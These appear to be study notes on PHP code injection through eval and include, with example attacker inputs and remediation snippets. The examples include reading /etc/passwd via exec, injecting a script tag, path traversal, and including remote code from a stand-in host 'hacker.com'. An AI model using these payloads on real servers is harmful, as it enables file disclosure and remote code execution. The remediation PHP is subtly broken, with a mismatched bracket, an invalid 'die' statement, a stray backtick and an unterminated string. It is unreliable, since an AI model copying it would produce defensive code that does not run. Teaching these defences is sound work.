# PHP Code Injection

- Remotely execute arbitrary PHP code
- Similar to remote system execution, but affects PHP instead of operating system commands
- Most common when using `eval` which executes a string as if it were PHP. It is powerful, but dangerous
- Remote file inclusion: `include` and `require`
- Example:
  - `eval($php_code)`
  - `eval("approve_comment(3911)");`
  - Hacker may run:
    - `eval("phpinfo()");`
    - `eval("echo exec('cat /etc/passwd')");`
    - `eval("echo 'hello'; ?><script>alert('Gotcha!');</script><?php ");`

  - `include($template)`
  - `include("templates/report.php");`
  - Hacker may run:
    - `include("../../private/admin_functions.php");`
    - `include("https://hacker.com/webserver_hack.php")` (Remote code execution)
    - `include("C:\\ftp\\upload\\webserver_hack.php");`  (Local code execution)

## Remediation / Solutions

- Avoid using `eval` It is rarely necessary and code using it can usually be rewritten
- Avoid using dynamic data with `eval`, `include`, `require`
- PHP Configuration: `disable_functions` Disable functions that are insecure or not needed
  - Use an allow list with dynamic data:

```php
$valid_templates = ['report.php', 'export.php', 'summary.php');
if(!in_array($template, $valid_templates)) {
    die "Invalid template";`
}
```

- Use an allow or deny list to filter out characters with special meaning to PHP:

```php
// preg_replace(regex, new_value, string)
$x = preg_replace("/[^A-Za-z0-9_]/", "", $string);

// str_replace(search, replace, string)
$invalid_chars = ['/', '\', '.', ';'];
$x = str_replace($invalid_chars, "", $string);
```